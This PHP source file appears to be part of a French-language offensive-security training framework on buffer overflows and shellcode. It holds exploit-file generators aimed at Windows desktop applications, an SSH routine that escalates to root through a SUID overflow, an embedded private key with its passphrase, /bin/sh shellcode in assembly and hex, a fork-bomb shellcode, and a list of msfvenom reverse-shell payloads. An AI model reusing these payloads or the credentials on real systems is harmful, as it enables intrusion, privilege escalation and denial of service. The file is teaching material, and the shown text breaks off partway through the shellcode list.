<?php
class poc4bof extends poc4lan {

	
	public function __construct() {
		parent::__construct();

	}
	
	// OK
	//$shellcode_calc_win = '\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca';
	
	// OK - -b '\x00\xff\x0a\x0d'
	//$shellcode_calc_win = '\xda\xcd\xd9\x74\x24\xf4\xb8\x50\x99\x22\x39\x5b\x33\xc9\xb1\x31\x31\x43\x18\x83\xc3\x04\x03\x43\x44\x7b\xd7\xc5\x8c\xf9\x18\x36\x4c\x9e\x91\xd3\x7d\x9e\xc6\x90\x2d\x2e\x8c\xf5\xc1\xc5\xc0\xed\x52\xab\xcc\x02\xd3\x06\x2b\x2c\xe4\x3b\x0f\x2f\x66\x46\x5c\x8f\x57\x89\x91\xce\x90\xf4\x58\x82\x49\x72\xce\x33\xfe\xce\xd3\xb8\x4c\xde\x53\x5c\x04\xe1\x72\xf3\x1f\xb8\x54\xf5\xcc\xb0\xdc\xed\x11\xfc\x97\x86\xe1\x8a\x29\x4f\x38\x72\x85\xae\xf5\x81\xd7\xf7\x31\x7a\xa2\x01\x42\x07\xb5\xd5\x39\xd3\x30\xce\x99\x90\xe3\x2a\x18\x74\x75\xb8\x16\x31\xf1\xe6\x3a\xc4\xd6\x9c\x46\x4d\xd9\x72\xcf\x15\xfe\x56\x94\xce\x9f\xcf\x70\xa0\xa0\x10\xdb\x1d\x05\x5a\xf1\x4a\x34\x01\x9f\x8d\xca\x3f\xed\x8e\xd4\x3f\x41\xe7\xe5\xb4\x0e\x70\xfa\x1e\x6b\x8e\xb0\x03\xdd\x07\x1d\xd6\x5c\x4a\x9e\x0c\xa2\x73\x1d\xa5\x5a\x80\x3d\xcc\x5f\xcc\xf9\x3c\x2d\x5d\x6c\x43\x82\x5e\xa5\x20\x45\xcd\x25\x89\xe0\x75\xcf\xd5';
	

	// ##################################################################################################
	
	
	function poc4malware4buffer_overflow_intro() {
	    
	    $this->article("Introduction", "In 1988, the first buffer overflow was exploited to compromise many systems. After 20 years, applications are still vulnerable, despite the efforts made in hope to reduce their vulnerability.
In the past, the most complex priority was discovering bugs, and nobody cared about writing exploits because it was so easy. Nowadays, exploiting buffer overflows is also difficult because of advanced defensive technologies.
Some strategies are adopted in combination to make exploit development more difficult than ever like ASLR, Non-executable memory sections, etc.
In this tutorial, we will describe how to defeat or bypass ASLR, NX, ASCII ARMOR, SSP and RELRO protection in the same time and in a single attempt using a technique called Returned Oriented Programming.
Let’s begin with some basic/old definitions:
→ NX: non-executable memory section (stack, heap), which prevent the execution of an arbitrary code. This protection was easy to defeat it if we make a correct ret2libc and also borrowed chunk techniques.
→ ASLR: Address Space Layout Randomization that randomizes a section of memory (stack, heap and shared objects). This technique is bypassed by brute forcing the return address.
→ ASCII ARMOR: maps libc addresses starting with a NULL byte. This technique is used to prevent ret2lib attacks, hardening the binary.
→ RELRO: another exploit mitigation technique to harden ELF binaries. It has two modes:
    Partial Relro: reordering ELF sections (.got, .dtors and .ctors will precede .data/.bss section) and make GOT much safer. But PLT GOT still writable, and the attacker still overwrites it.
Non-PLT GOT is read-only.
Compile command: gcc -Wl,-z,relro -o bin file.c
    Full Relro: GOT is remapped as READ-ONLY, and it supports all Partial RELRO features.
Compiler command: gcc -Wl,-z,relro,-z,now -o bin file.c
→ SSP: Stack Smashing Protection:
Our Exploit will bypass all those mitigations, and make a reliable exploit.
	        
Depuis les années 1970, la communauté académique s'est intéressée à étudier les erreurs, vulnérabilités et défauts présents sur les systèmes informatiques. La documentation sur la faille de débordement de pile (« buffer overflow ») avait été rendue publique, du moins partiellement. En novembre 1988, un ver du nom de Morris avait infecté 10% des systèmes reliés à Internet. Ce ver s’était propagé en exploitant entre autres un « buffer overflow » sur le service « fingerd » sous Unix.
	        
	" );
	    
	    $this->ssTitre("Exploits Remuneration" );
	    $this->net("http://www.pcworld.com/article/259943/researcher_wins_200000_prize_from_microsoft_for_new_exploit_mitigation_technology.html" );
	    $this->net("http://www.microsoft.com/security/bluehatprize/" );
	    $this->net("http://www.forbes.com/sites/andygreenberg/2012/03/23/shopping-for-zero-days-an-price-list-for-hackers-secret-software-exploits/" );
	    $this->net("http://en.wikipedia.org/wiki/Timeline_of_Microsoft_Windows" );
	    $this->net("http://en.wikipedia.org/wiki/Comparison_of_operating_systems" );
	    $this->net("https://www.recordedfuture.com/assets/custom-tuning-cyber-application.png" );
	    $this->net("https://www.recordedfuture.com/assets/bank-cyber-monitor.png" );
	    $this->net("https://vuldb.com/?recent");
	    $this->pause ();
	    $this->ssTitre("How Buy 0 day Vulnerabilities" );
	    $this->net("http://www.washingtonpost.com/blogs/the-switch/wp/2013/08/31/the-nsa-hacks-other-countries-by-buying-millions-of-dollars-worth-of-computer-vulnerabilities/" );
	    $this->net("http://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html?pagewanted=all&_r=1&" );
	    $this->pause ();
	    $this->net("http://0xdabbad00.com/2013/04/07/prevalence-of-memory-corruption-exploits/" );
	    $this->net("https://nebelwelt.net/blog/20130312-wargames-in-memory-shall-we-play-a-game.html" );
	    $this->net("http://hackmageddon.com/2014-cyber-attacks-timeline-master-index/" );
	    $this->pause ();
	    
	    $this->titre("les Etats espionnent" );
	    $this->net("http://www.nrc.nl/nieuws/2013/11/23/nsa-infected-50000-computer-networks-with-malicious-software/" );
	    $this->img("$this->dir_img/bof/bug_hunter.png");
	    $this->article("Les fonctions vulnérables", "Notre exemple de programme vulnérable utilisait la fonction strpcy() qui ne contrôle pas la longueur de la string copiée. D'autres fonctions peuvent aussi être utilisées de
façon à ce que si la longueur des arguments n'est pas contrôlée il y ait un risque d'overflow. Voici une liste de fonctions qui peuvent faire apparaître ce genre de
vulnérabilités:
1.  strcat(), strcpy()
2.  sprintf(), vsprintf()
3.  gets()
4.  la famille des fonctions scanf() (scanf(), fscanf(), sscanf(), vscanf(), vsscanf()
et vfscanf()) si la longueur des données n'est pas contrôlée
5.  suivant leur utilisation: realpath(), index(), getopt(), getpass(), strecpy(),
streadd() et strtrns()" );
	    $this->article("segmentation fault ou bus error", "Survient lorsqu’un programme tente d’allouer en mémoire plus de données que l’espace reservé " );
	    $this->pause ();
	    $this->ssTitre("Windows Protection" );
	    $this->net("http://www.microsoft.com/security/sir/strategy/default.aspx#!section_3_3" );
	    $this->img("$this->dir_img/bof/code_reuse_timeline1.png");
	    $this->img("$this->dir_img/bof/stats_pdf.jpg");
	    $this->img("$this->dir_img/bof/vuln_bof.png");
	    
	    
	}
	
	
	public function poc4malware4backdoor4exploit(){
	    $this->gtitre("Failles Applicatives - BufferOverflow");
	    $target_vmx_name = "xp3" ;
	    $target_ip = "10.60.10.129"; // xp3
	    $target_port = 8080 ;
	    $attacker_ip = "10.60.10.1";
	    $attacker_port = $this->proxy_port_burp;
	    $file_path_output = "test";
	    $snapshot = "test";
	    $malware = new malware4win($target_vmx_name, $target_ip, $target_port, $attacker_ip, $attacker_port, $file_path_output, $snapshot);
	    $malware->question("est il possible de prendre le controle d'une machine a partir d'une image , d'un pdf ou d'un fichier MP3 ?");
	    $malware->bof2exp4app4local2pdf("$this->dir_tmp/poc_doc.pdf");$this->pause();
	    $malware->bof2exp4app4local2vlc("$this->dir_tmp/poc_vlc.s3m");$this->pause();
	    $malware->bof2exp4app4local2img("$this->dir_tmp/poc_img.bmp");$this->pause();
	    $malware->bof2exp4app4local2mp3("$this->dir_tmp/poc_music.lst");$this->pause();
	    $malware->bof2exp4app4local2realplayer("$this->dir_tmp/poc_realplayer.rm");$this->pause();
	    $malware->bof2exp4app4local2firefox("poc_firefox.html");$this->pause(); // OK
	    $malware->bof2exp4app4local2quicktime("poc_quicktime.html");$this->pause(); // OK
	    $malware->bof2exp4app4local2flash("poc_flash.html");$this->pause();
	}
	
	
	public function poc4root8suid8app2bof(){
	    $this->ssTitre(__FUNCTION__);
	    $eth = 'vmnet6';
	    $domain = 'hack.vlan';
	    
	    $ip = "10.60.10.134"; // covfefe
	    $port = "22";
	    $protocol = "T";
	    $user_name_created = "simon" ;
	    $private_key_str = "-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BD8515E8D3A10829A4D710D5AFAC64AB
	        
FCY9ADNWL6702rP3vBGwzSSNXMojtui0v94aefo2O0Wz0n75YcOAKuj1eNA6hnG5
qGAaJKI7exONZ3GGf+6JZjORn9yTrj6Cc/tZr6dw9BQFHCQcBPBPpWBZO2IGVsvJ
Mf5H50v4QvL9RJl0Zcn0wGKgcuK4m0SyWD1ZKTQ3O2peRCmHIc39cyGOFMSRqhVU
7iMryuPbNZdOuzK8F0mCKKdvOwLhfdEQh2GOKJJ8CAI+Pb/NEvIDkDlsh2t148/D
kExxOmmVS/NTP9ixyOXc7NL34GHP/mfw/OLVUBVGubEkWA/KdNXkYPWcv+RskwMU
Dz5JVSduyVMdlskKL1h11UETb+WDPGKktO+dYYnCupi4NGROuOcpj57B5gLOdmxy
uH7gqTltd6uzASFEXS7rKDniG5Fu8C6zab0bCbM0DDzAexAgPQpweJqvSfqpQpKP
vmAeXnYGu7tw+U5d6CypS0qhS2P07lyboANstYOBrSzFIZF7LuotgPBSGtfTIkYb
lH8dyk7VEjIZ51exC4ACdJ/Hqhe08m++2f729m/UL/McEGGiZ4r2df5lPIEq8X4b
Wdu0SYRIi0J0PoGRrUFJ85j8C+yQXV5CIMAC3LUeDlTUcTEZvhbV8E+tB/zDNEUK
WuH2+4dlUEA4kyiMsoZNUcgIzhbuF7FK+lDxybjsscRG6fDFECmphiqD+jel2C+b
QK4dOF23OoYwIbx/XFEa7VNRTnkzANQBi4ELGFsc4uZs9conJfb9T3EXrRJjX9jK
0abmJthTd3wbiZa10nGwhEzXUCVPvh1j+tbn6xHldsqEc4RjZLnXmalBJ6DxgTxn
24Ozy1+y0CsycEUHG7b3jTUMvlNs0VCAB7YJUZYHdlPwjMeAOklSeI0MgsmeMOXr
S+LZzoBq0gzmm5Va1hnjFRgBnDgEMNe1KVU+QZy1O2J0yJT/VaKeME80uOP3z/Q3
kUGmzgGM2gCrXDwbAKfQzUp8pUR0fZT0pGrgsprpWItCvUfymb8MzdmVD6qzCfYC
tskyUU6wpQrEH7rA244azObC/HlFulYFAQmNdilguTNpou4TMTXNFfHAuq3DZL67
RJks2xiJKK3XUbXuFP0QIpfHnDnjJIlCKBVDxcUWLCpARWI8OsY4qEY/DlDu3aU3
b3K/+LdyndDfbb7edi4OJob7A0bSdlFfOhSRlmyeSgFe5oFTvIAevL0ph3nhgik7
DELkQnFE/xc49nPtchYZDJ6ifExb5WTO8XHCZb+bjf1BX3kAKSTfRZeowbc+gfAD
ZxGvHc9T8B30hujl04UCPMXlVR/X5/m9I0hnZKIuRDsJH1waZ+CJj6I93T5GKUKT
kMyZLUf+pmzRbLwdyNuUe+QTTano8SyK9rMLlthoXxCUFeoF3Q1bNOV8CWbXCLgl
2s4BObMEU9B4fzSMHUa9LpXz8LQvv74L0mnDJ3Jk82+gQuk6P4haTd03MI9ecZ8U
B0u8R3H9rzAYYr31q2YbZo03enMkRFC9DaEz4P3hMGCuGErQ8tuX3I07hOZGtm8B
TJAwpCifrLpx1myEg4kz4OhvWk5cL9qV8SP48T0aBoXHtUZFHa6KBNUpoV8QMhyI
-----END RSA PRIVATE KEY-----";
	    $private_key_passwd = "starwars";
	    
	    $hash_sha1 = sha1($private_key_str);
	    
	    $private_key_file = "/tmp/$hash_sha1.priv";
	    $this->str2file($private_key_str, $private_key_file);
	    $public_key_file = "/tmp/$hash_sha1.pub";
	    
	    //$private_key_file = "/tmp/$hash_sha1.priv.tmp";
	    //$public_key_file = "$private_key_file.pub";
	    
	    
	    
	    $flag_poc = FALSE;
	    //$flag_poc = TRUE;
	    
	    $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
	    $test->poc($flag_poc);
	    $test->key2gen4public("", 10, $private_key_file, $public_key_file, $private_key_passwd);
	    
	    
	    $stream = $test->stream8ssh8key8public($test->ip, $test->port, $user_name_created, $public_key_file, $private_key_file, $private_key_passwd);
	    
	    //$stream = $test->stream8ssh2key8priv4str($test->ip, $test->port, $user_name_created,$private_key_str, $private_key_file, $private_key_passwd);
	    //$test->stream4root($stream);
	    
	    if (is_resource($stream)){
	        //$test->openvas($ip);
	        //var_dump($stream);echo get_resource_type($stream);$test->pause();
	        //$test->yesAUTH($test->ip, $test->port, $test->protocol, $user_name_created, $user_name_pass, "", "", "", "", "", __FUNCTION__, $test->ip2geoip());
	        $template_id = "%ID%";
	        $template_cmd = "ssh $user_name_created@$test->ip -p $test->port -i $private_key_file.pem -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -C  \"%CMD%\"";
	        $templateB64_id = base64_encode($template_id);
	        $templateB64_cmd = base64_encode($template_cmd);
	        
	        $data = "id";
	        $rst_id = $test->req_str($stream, $data, 10,"");
	        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $test->parse4id($rst_id);
	        $id8b64 = base64_encode($id);
	        $this->article("CREATE Template ID", $template_id);
	        $this->article("CREATE Template BASE64 ID", $templateB64_id);
	        $this->article("CREATE Template CMD", $template_cmd);
	        $this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
	        $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
	        $templateB64_shell = base64_encode($template_shell);
	        $this->article("CREATE Template SHELL", $template_shell);
	        $this->article("CREATE Template BASE64 SHELL", $templateB64_shell);
	        
	        $user_name_pass = "";
	        $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$user_name_pass);
	        $obj_lan->poc($test->flag_poc);
	        
	        
	        
	        //$strings_etc_passwd = $obj_lan->lan2stream4result($data, $timeout);
	        //$obj_lan->parse4etc_passwd($strings_etc_passwd);
	        //$obj_lan->misc2keys();$this->pause();
	        //$obj_lan->jobs();
	        
	        
	        $suid_path = "/usr/local/bin/read_message";
	        //return $obj_lan->suids4one($suid_path);
	        return $obj_lan->suids8bof($suid_path);
	        
	    }
	    
	    
	}
	
	
	
	function poc4shellcode() {
	
	
		$unistd = trim($this->req_ret_str("locate unistd_32.h | grep \"unistd_32.h\$\" | tail -1"));
	
		$this->article("Shellcode", "Le shellcode est un élément indispensable de chaque exploit.\nPendant l'attaque, il est injecté à un programme opérationnel et lui fait éxécuter les opérations demandées.");
		$this->pause();
		$this->img("$this->dir_img/bof/prog_compilation.png");
		$this->titre("Construction d'un programme PAUSE en C");
		$file_bin_pause_path = $this->c2bin4code("void main(){pause();}","-m32","$this->dir_tmp/pause_c.c");
	
		$this->cmd("localhost",$file_bin_pause_path);
		$this->gras("Ctrl+C -> Sortir");
		$this->pause();
		$this->titre("Construction d'un programme PAUSE en Assembleur");
		$this->ssTitre("Assembly syntax");
		$this->article("AT&T vs. NASM", "There are two main forms of assembly syntax: AT&T and Intel. AT&T syntax is used by the GNU Assembler(gas), contained in the gcc compiler suite, and is often used by Linux developers. Of the Intel syntax assemblers, the Netwide Assembler(NASM) is the most commonly used. The NASM format is used by many windows assemblers and
debuggers. The two formats yield exactly the same machine language; however, there
are a few differences in style and format:
• The source and destination operands are reversed, and different symbols are used to mark the beginning of a comment:
• NASM format: CMD <dest>, <source> <; comment>
• AT&T format: CMD <source>, <dest> <# comment>
• AT&T format uses a % before registers; NASM does not.
• AT&T format uses a $ before literal values; NASM does not.
• AT&T handles memory references differently than NASM.
		NASM Syntax               NASM Example                AT&T Example
mov <dest>, <source>       mov eax, 51h ;comment       movl $51h, %eax #comment
push <value>               push eax                    pushl %eax
pop <dest>                 pop eax                     popl %eax
add <dest>, <source>       add eax, 51h                addl $51h, %eax
sub <dest>, <source>       sub eax, 51h                subl $51h, %eax
xor <dest>, <source>       xor eax, eax                xor %eax, %eax
jnz <dest>/jne <dest>      jne start                   jne start
jz <dest>/je <dest>        jz loop                     jz loop
jmp <dest>                 jmp end                     jmp end
call <dest>                call subroutine1            call subroutine1
ret                        ret                         ret
inc <dest>                 inc eax                     incl %eax
dec <dest>                 dec eax                     decl %eax
lea <dest>, <source>       lea eax, [dsi +4]           leal 4(%dsi), %eax
int <val>                  int 0x80                    int $0x80
	
		");
		$this->pause();
		$this->ssTitre("Connaitre SysCall de Pause");
		$this->article("SysCall", "Il faut savoir que chaque syscall(appel système) est fourni par le noyau du système d'exploitation.");
		$this->article("Exemple d'appel system fréquement utilisé", "open, write, read, close, chmod, chown...etc");
		$this->article("64 bits", "/usr/include/x86_64-linux-gnu/asm/unistd_64.h");
		$this->requette("cat $unistd  | egrep \"(NR_exit|NR_read|NR_write|NR_open|NR_close|NR_chmod|NR_getuid|NR_pause)\" ");
		$this->requette("gedit $unistd ");
		$this->pause();
		$this->cmd("localhost", "man syscalls");
		$this->pause();
	
		$this->ssTitre("Recherche le numero de l'appel System Pause");
		$this->requette("cat $unistd | grep \"NR_pause\"");
		$this->ssTitre("Codage en Assembleur");
		$file_asm_pause_name = $this->asm2bin("BITS 32\nsection .text\n\tglobal _start\n_start:\n\tmov eax,29\n\tint 0x80\n",32,"$this->dir_tmp/pause_s");
		$this->cmd("localhost", $file_asm_pause_name);
		$this->gras("Ctrl+C -> Sortir");
		$this->pause();
	
		$this->titre("Construction d'un programme Exit en C - fonction exit prend un argument 0");
		$file_c_exit_name = $this->c2bin2exec("void main(){exit(0);}","-m32","$this->dir_tmp/exit_c");
		$this->pause();
		$file_c_exit_obj = new bin($file_c_exit_name);
		//$exit_hex = $file_c_exit_obj->bin4elf2hex(); $this->hex2exec($exit_hex); // segfault 		$this->hex2graph($exit_hex);  // no map
	
		$this->pause();
		$this->titre("Construction d'un programme EXIT(0) en Assembleur");
		$this->ssTitre("Recherche le numero de l'appel System Exit");
		$this->requette("cat $unistd | grep \"NR_exit\" | head -1");
	
		$exit_s = <<<PS
BITS 32
section .text
		global _start
_start:
		mov eax,1
		xor ebx,ebx
		int 0x80
PS;
		$file_exit_asm_path = $this->asm2exec($exit_s,32,"$this->dir_tmp/exit_s");
		$this->pause();
		$file_exit_asm_obj = new bin($file_exit_asm_path);
	
		$this->article("EAX", "va contenir le numéro du syscall, soit 1");
		$this->article("EBX", "va contenir le premier argument de exit, 0.");
		$this->article("\tNote", "\txor a,b si a=b => xor a,b=0\n\t\t\txor ebx,ebx=0(pour éviter les NULL BYTES)");
		$this->article("ECX", "va contenir le deuxième argument. 0");
		$this->article("EDX", "va contenir la longueur de la chaîne(3ème argument), 0");
		$this->pause();
		$this->img("$this->dir_img/shellcode/Les_registres_du_processeur_x86_et_leur_destination.png");
		$this->pause();
	
		$this->titre("les OpCode");
		$file_exit_asm_obj->bin2opcode2asm();
		$this->gras("Tout à droite nous retrouvons nos instructions en asm, au milieu nous avons leur équivalence en hexadecimal(opcode) et à gauche nous avons l'adresse des instructions dans notre programme.\n");
		$this->pause();
	
		$this->article("shellcode", " est constitué d’opcode");
		$this->ssTitre("Extraction des opcode(le shellcode) a partir du fichier ELF en asm");
		$exit_s_hex = $file_exit_asm_obj->bin4elf2hex();
		$this->hex2exec($exit_s_hex);$this->pause();
		$this->hex2graph($exit_s_hex);$this->pause();
	
		$this->titre("Comprendre les Appels System - cas de printf");
		$file_bin_printf_name = $this->c2bin2exec("void main(){printf(\"Hello World !\");}","-m32","$this->dir_tmp/printf_c");
		$this->pause();
	
		$this->ssTitre("Voir l'appel system generer par PRINTF");
		$file_bin_printf_obj = new bin($file_bin_printf_name);
		$file_bin_printf_obj->bin2syscall();
	
		$this->pause();
		$this->ssTitre("Recoder le programme en C avec l'appel system trouvé(write) ");
		$this->ssTitre("Nombre de caracteres dans la chaine ");
		$this->requette("echo 'Hello World !' | wc -c ");
		$this->requette("echo 'Hello World !' | hexdump -C ");
		$this->requette("bash -c \"/bin/echo -e \\\"\\x0a\\x0a\\\"\" | wc -l ");
		$this->pause();
	
		$file_bin_write_path = $this->c2bin2exec("void main(){write(1,\"Hello World !\",13);}","-m32","$this->dir_tmp/write_c");
		$this->pause();
		$this->requette("$file_bin_write_path | wc -c");
		$this->requette("$file_bin_write_path | hexdump -C ");
		$this->pause();
	
		$file_bin_write_obj = new bin($file_bin_write_path);
		$file_bin_write_obj->bin2opcode2asm();
		//$write_hex = $file_bin_write_obj->bin4elf2hex();$this->hex2exec($write_hex);$this->pause(); // segfault 		$this->hex2graph($write_hex);$this->pause(); // no map
	
	
	
	
		$this->ssTitre("Recoder le programme en ASM avec l'appel system trouve(write) ");
		$this->cmd("localhost", "man 2 write");
		$write_s = <<<WRT
BITS 32
section .text
		global _start
_start:
		jmp two
one:
		pop ecx
; write(1, "hello, world!", 13)
		mov eax, 4
		mov ebx, 1
		mov edx, 13
		int 0x80
; exit(0)
		mov eax, 1
		mov ebx, 0
		int 0x80
two:
		call one
db "hello, world!", 0x0d
WRT;
	
		$file_write_asm_path = $this->asm2exec($write_s,32,"$this->dir_tmp/write_s");
		$this->pause();
		$file_write_asm_obj = new bin($file_write_asm_path);
		$file_write_asm_obj->bin2opcode2asm();
		$write_s_hex = $file_write_asm_obj->bin4elf2hex();
		$this->hex2exec($write_s_hex);$this->pause();
		//$this->hex2graph($write_s_hex);$this->pause(); // no map
	
	
		$this->img("$this->dir_img/shellcode/asm_instruction.png");
		$this->pause();
		$this->article("EAX", "va contenir le numéro du syscall, soit 4");
		$this->article("EBX", "va contenir le premier argument de write, 1.");
		$this->article("ECX", "va contenir le deuxième argument, soit l'adresse de la chaîne \"Hello World !\".");
		$this->article("EDX", "va contenir la longueur de la chaîne(3ème argument), 13, ou 0x0e.");
		$this->pause();
	
		$this->titre("Using No NULL Bits");
		$this->gras("\tPour injecter un shellcode passer en argument a une faille buffer Overflow, nous devons avoir aucun 00 sinon notre shellcode marquerait la fin de la chaîne de caractère représentée par celui­ ci.\n");
		$name = "argv";
		$c_code = 'void main(int argc, char **argv){\nint i;\nprintf("\\\tNombre D arguments %d\\\n",argc);\nfor(i=0;i<argc;i++)\nprintf("\\\targv[%d] at %p = %s \\\n",i,argv[i],argv[i]);\n}';
		$programme = $this->c2bin4code($c_code,"-m32","$this->dir_tmp/$name");
		$this->ssTitre("Nombre d'arguments");
		$this->cmd("localhost", "$programme \$(python -c 'print \"\\x41\\x42\x00\\x43\\x44\\x20\\x45\\x46\\x47\\x90\\x41\\x00\\x42\\x0a\\x45\\x46\\x47\"')");
		$this->pause();
		$this->ssTitre("Eliminer les Octets Nuls dans EAX EBX EDX");
		$this->article("Octets Nuls", "Cela est dû au fait que tous les nombres sont stockés sur 4 octets. Par exemple, l'instruction mov eax, 11 dans le shellcode est représentée par B8 0b 00 00 00(mov eax est 0xB8, et 11 est 0x0000000b).
Pour y remédier, vous pouvez vous servir de registres plus petits stockés sur un octet tels que AL,BL, CL et DL au lieu de quatre octets comme pour EAX, EBX, ECX et EDX.");
		$this->article("transforme", "call -> jmp short");
		$this->requette("objdump -M intel -d -j .text $file_write_asm_path");
		$this->requette("objdump -M intel -d -j .text $file_write_asm_path | grep '00' ");
		$this->article("remplacer les registres", " 32bits par 16 ou 8 bits de sorte qu'il n'a pas de zero ");
		$this->pause();
		$this->img("$this->dir_img/shellcode/eax.png");
		$this->img("$this->dir_img/bof/x86_registre.png");
		$this->pause();
	
	
		$write2_s = <<<WRT
BITS 32
section .text
		global _start
_start:
jmp short two
one:
pop ecx
; write(1, "hello, world!", 14)
xor eax, eax
mov al, 4
xor ebx, ebx
mov bl, 1
xor edx, edx
mov dl, 14
int 0x80
; exit(0)
xor eax, eax
mov al, 1
xor ebx, ebx
int 0x80
two:
call one
db "hello, world!", 0x0a
WRT;
		$file_write2_asm_path = $this->asm2exec($write2_s,32,"$this->dir_tmp/write2_s");
		$this->pause();
		$file_write2_asm_obj = new bin($file_write2_asm_path);
		$file_write2_asm_obj->bin2opcode2asm();
		$write2_s_hex = $file_write2_asm_obj->bin4elf2hex();
		$this->hex2exec($write2_s_hex);$this->pause();
		//$this->hex2graph($write2_s_hex);$this->pause(); // no map
		$this->note("pas d'Octets Nuls");
		$this->pause();
		$this->important("ne pas confondre opcode et code ascii en hex ");
		$this->pause();
	
	
		$this->cmd("localhost", "man 2 execve");
		$this->requette("cat $unistd | grep \"NR_execve\" | head -1");
		$this->pause();
		/*
$bin_sh_s = <<<BIN_SH
BITS 32
section .text
		global _start
_start:
; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; zero out eax
  xor ebx, ebx      ; zero out ebx
  xor ecx, ecx      ; zero out ecx
  cdq               ; zero out edx using the sign bit from eax
  mov BYTE al, 0xa4 ; syscall 164(0xa4)
  int 0x80          ; setresuid(0, 0, 0)  restore all root privs
	
; execve(const char *filename, char *const argv [], char *const envp[])
  push BYTE 11      ; push 11 to the stack
  pop eax           ; pop dword of 11 into eax
  push ecx          ; push some nulls for string termination
  push 0x68732f2f   ; push \"//sh\" to the stack
  push 0x6e69622f   ; push \"/bin\" to the stack
  mov ebx, esp      ; put the address of \"/bin//sh\" into ebx, via esp
  push ecx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve('/bin//sh', ['/bin//sh', NULL], [NULL])
BIN_SH;
	
	*/
		$file_bin_sh_asm_path = $this->asm2exec($bin_sh_s,32,"$this->dir_tmp/bin_sh_s");
		$this->pause();
		$file_bin_sh_asm_obj = new bin($file_bin_sh_asm_path);
		$file_bin_sh_asm_obj->bin2opcode2asm();
		$bin_sh_hex = $file_bin_sh_asm_obj->bin4elf2hex();
		$this->hex2exec($bin_sh_hex);$this->pause();
		//$this->hex2graph($bin_sh_hex);$this->pause(); // no map
	
	
		$bin_sh2_s = <<<BIN_SH
BITS 32
section .text
		global _start
_start:
; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; zero our eax
  push eax          ; push some nulls for string termination
  push 0x68732f2f   ; push \"//sh\" to the stack
  push 0x6e69622f   ; push \"/bin\" to the stack
  mov ebx, esp      ; put the address of \"/bin//sh\" into ebx, via esp
  push eax          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  mov al, 11        ; syscall #11
  int 0x80          ; do it
BIN_SH;
	
		$file_bin_sh2_asm_path = $this->asm2exec($bin_sh2_s,32,"$this->dir_tmp/bin_sh2_s");
		$this->pause();
		$file_bin_sh2_asm_obj = new bin($file_bin_sh2_asm_path);
		$file_bin_sh2_asm_obj->bin2opcode2asm();
		$bin_sh2_hex = $file_bin_sh2_asm_obj->bin4elf2hex();
		$this->hex2exec($bin_sh2_hex);$this->pause(); // ok
		$this->hex2graph($bin_sh2_hex);$this->pause();		 // ok
		$this->requette("msfvenom -l");
		$this->pause();
		$this->requette("msfvenom -h");
		$this->pause();
		$this->article("Quelques Payloads Interessants", "
\tlinux/x64/exec
\tlinux/x64/shell/reverse_tcp
\tlinux/x86/exec
\tlinux/x86/meterpreter/reverse_tcp
\twindows/exec
\twindows/meterpreter/reverse_https
\twindows/patchupmeterpreter/reverse_tcp_allports
\twindows/patchupmeterpreter/reverse_tcp_dns
\twindows/speak_pwned
\twindows/vncinject/reverse_tcp
\twindows/x64/exec
\tphp/exec
\tphp/bind_php
\tphp/meterpreter_reverse_tcp");
		$this->pause();
	
		$this->article("Shellcode Linux 32bits", "
		7 bytes -> fork bombe
\\x6a\\x02\\x58\\xcd\\x80\\xeb\\xf9
		8 bytes -> Sun solaris
\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80
		21 char
\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80
\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80
		23 bytes
\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
		24 bytes -> bash
\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80
		26 bytes -> execve(\"/bin/sh\", 0, 0);
\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68
		26 bytes
